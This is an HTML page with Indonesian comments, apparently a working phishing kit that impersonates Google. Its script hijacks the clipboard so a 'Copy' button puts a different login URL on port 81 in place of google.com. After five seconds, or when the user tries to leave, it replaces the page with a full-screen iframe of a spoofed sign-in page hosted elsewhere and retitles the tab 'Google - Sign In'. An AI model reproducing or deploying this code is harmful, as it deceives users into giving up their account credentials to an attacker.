<!DOCTYPE HTML>
<html>
<head>
    <meta charset="utf-8">
    <title>Google</title>
</head>
<body>
    <p>Click the button below and right click and 'paste' in the address bar to navigate press Enter </p>
    <input id="tst" value="https://www.google.com" disabled size="50"><br>
    <button onclick="copyt()">Copy</button>

    <script>
        // Logika Clipboard Hijacking
        function copyt(){
            const tst = document.getElementById('tst');
            tst.disabled = false;
            tst.select();
            document.execCommand('copy');
            tst.disabled = true;
        }

        document.getElementById('tst').oncopy = function(e){
            // Mengganti teks yang disalin dengan URL jebakan
            e.clipboardData.setData('text/plain', 'http://google.com:81/login.html');
            e.preventDefault();
        }

        // Fungsi untuk memicu tampilan login (Spoofing)
        function triggerLogin() {
            document.body.innerHTML = '<iframe src="https://cnfdnfial-ops.github.io/spoof/login" style="width:100%;height:100vh;border:none"></iframe>';
            document.title = "Google - Sign In";
        }

        // Pemicu otomatis setelah 5 detik (5000 ms)
        setTimeout(triggerLogin, 5000);

        // Pertahanan tetap jika user mencoba meninggalkan halaman
        window.onbeforeunload = function() {
            triggerLogin();
        };
    </script>
</body>
</html>
